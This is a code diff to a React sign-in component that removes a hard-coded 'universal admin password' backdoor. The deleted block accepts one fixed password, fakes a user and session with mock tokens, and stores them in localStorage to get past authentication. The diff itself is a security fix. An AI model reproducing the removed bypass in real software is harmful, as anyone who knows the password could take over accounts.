@@ -52,46 +52,7 @@ export default function Auth() {
       return;
     }
 
-    // Check for universal admin password
-    if (signInData.password === 'admin2024!') {
-      try {
-        // Create a mock user and session for universal admin
-        const mockUser = {
-          id: 'admin-user',
-          email: signInData.email,
-          created_at: new Date().toISOString(),
-          updated_at: new Date().toISOString(),
-          aud: 'authenticated',
-          role: 'authenticated',
-          app_metadata: {},
-          user_metadata: {}
-        };
-
-        const mockSession = {
-          access_token: 'mock-admin-token',
-          refresh_token: 'mock-refresh-token',
-          expires_in: 3600,
-          token_type: 'bearer',
-          user: mockUser
-        };
-        
-        // Store in localStorage with a key that AuthContext will recognize
-        localStorage.setItem('universal-admin-session', JSON.stringify({
-          user: mockUser,
-          session: mockSession
-        }));
-        
-        toast.success('Successfully signed in with admin credentials!');
-        
-        // Force a page reload to trigger AuthContext to pick up the new session
-        window.location.reload();
-      } catch (error) {
-        setError('An unexpected error occurred');
-      } finally {
-        setIsSubmitting(false);
-      }
-      return;
-    }
+    // Universal admin backdoor removed for security
 
     try {
       const { error } = await signIn(signInData.email, signInData.password);
